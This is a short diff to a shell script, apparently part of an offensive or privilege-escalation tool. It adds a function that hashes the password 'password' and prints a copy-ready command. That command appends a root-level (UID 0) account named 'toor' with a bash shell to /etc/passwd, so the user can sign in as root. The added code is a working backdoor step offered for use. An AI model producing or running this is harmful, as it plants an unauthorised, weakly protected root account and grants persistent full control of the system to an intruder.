@@ -303,4 +303,10 @@ function check() {
     esac
 }
 
+new_user() {
+    log --bold -f green "[i] copy to add an user and sign-in toor:password"
+    hash=$(openssl passwd -1 "password")
+    echo "echo 'toor:$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
+}
+
 clear
